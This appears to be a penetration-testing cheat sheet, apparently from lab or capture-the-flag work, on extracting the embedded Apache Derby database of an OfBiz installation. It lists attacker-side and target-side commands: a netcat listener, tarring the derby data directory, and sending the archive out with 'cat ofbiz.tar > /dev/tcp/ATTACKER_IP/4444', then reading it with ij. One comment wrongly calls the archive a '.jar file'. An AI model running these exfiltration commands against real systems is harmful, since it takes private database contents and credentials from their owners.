# Apache Derby Embedded Java Database

### Encountered in applications: 

#### 1) OfBiz (Location: /opt/ofbiz)

## Database extraction

### Steps

## Attacker

 - sudo apt install derby-tools (Install the tool needed to interact with the database)

 - nc -nlvp 4444 > ofbiz.tar (On attacking machine, run netcat to open a port, then send all data to the .jar file to download the database)

## Target Machine

 - cd /opt/ofbiz/runtime/data/derby

 - tar cvf ofbiz.tar ofbiz

 - cat ofbiz.tar > /dev/tcp/ATTACKER_IP/4444 (Compress the entire database with tar, then write all data to our listener)

## Once downloaded, we extract the archive and use ij to inspect the database on our attacking machine

 - tar xvf ofbiz.tar

 - ij
